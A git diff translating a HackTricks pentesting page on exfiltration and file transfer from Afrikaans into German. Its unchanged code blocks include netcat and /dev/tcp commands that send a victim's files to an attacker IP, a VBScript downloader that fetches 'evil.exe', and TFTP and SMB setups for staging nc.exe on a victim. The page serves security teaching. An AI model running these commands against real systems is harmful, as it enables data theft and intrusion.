@@ -15,9 +15,9 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-## Gewoonlik gewhitelist domeine om inligting te exfiltreer
+## Häufig whitelisted Domains zum Exfiltrieren von Informationen
 
-Check [https://lots-project.com/](https://lots-project.com/) om gewoonlik gewhitelist domeine te vind wat misbruik kan word
+Check [https://lots-project.com/](https://lots-project.com/) um häufig whitelisted Domains zu finden, die missbraucht werden können
 
 ## Copy\&Paste Base64
 
@@ -55,11 +55,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Laai lêers op
+### Dateien hochladen
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer wat GET en POSTs (ook koptekste) druk**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Python module [uploadserver](https://pypi.org/project/uploadserver/):
+* [**SimpleHttpServer, der GET- und POST-Anfragen (auch Header) druckt**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* Python-Modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -72,7 +72,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Bediener**
+### **HTTPS-Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -115,17 +115,17 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP-bediener (python)
+### FTP-Server (Python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP-bediener (NodeJS)
+### FTP-Server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP-bediener (pure-ftp)
+### FTP-Server (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -143,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** kliënt
+### **Windows**-Client
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -156,14 +156,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali as bediener
+Kali als Server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb deel **met samba**:
+Oder erstellen Sie einen smb-Share **mit Samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -188,13 +188,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Die aanvaller moet SSHd aan die gang hê.
+Der Angreifer muss SSHd laufen haben.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-As die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller monteer.
+Wenn das Opfer SSH hat, kann der Angreifer ein Verzeichnis vom Opfer zum Angreifer einbinden.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -207,19 +207,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Laai lêer af van slagoffer
+### Datei vom Opfer herunterladen
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Laai lêer op na slagoffer
+### Datei an das Opfer hochladen
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-dank aan **@BinaryShadow\_**
+danke an **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -241,33 +241,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-As jy data na 'n SMTP-bediener kan stuur, kan jy 'n SMTP skep om die data met python te ontvang:
+Wenn Sie Daten an einen SMTP-Server senden können, können Sie ein SMTP erstellen, um die Daten mit Python zu empfangen:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Standaard in XP en 2003 (in ander moet dit eksplisiet tydens installasie bygevoeg word)
+Standardmäßig in XP und 2003 (in anderen muss es während der Installation ausdrücklich hinzugefügt werden)
 
-In Kali, **begin TFTP bediener**:
+In Kali, **TFTP-Server starten**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP-bediener in python:**
+**TFTP-Server in Python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **slagoffer**, verbind met die Kali-bediener:
+In **victim**, verbinden Sie sich mit dem Kali-Server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Laai 'n lêer af met 'n PHP oneliner:
+Lade eine Datei mit einem PHP-Oneliner herunter:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -275,7 +275,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**Slachtoffer**
+**Opfer**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -309,13 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program stel nie net in staat om binêre te inspekteer nie, maar het ook die **vermoë om hulle vanaf hex te herbou**. Dit beteken dat deur 'n hex van 'n binêre te verskaf, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om te noem dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte te monteer**.
+Das `debug.exe` Programm ermöglicht nicht nur die Inspektion von Binaries, sondern hat auch die **Fähigkeit, sie aus Hex zu rekonstruieren**. Das bedeutet, dass durch die Bereitstellung eines Hex eines Binaries `debug.exe` die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung hat, Dateien bis zu 64 kb Größe zusammenzustellen**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
+Dann fügen Sie den Text in die Windows-Shell ein, und eine Datei namens nc.exe wird erstellt.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -324,16 +324,16 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
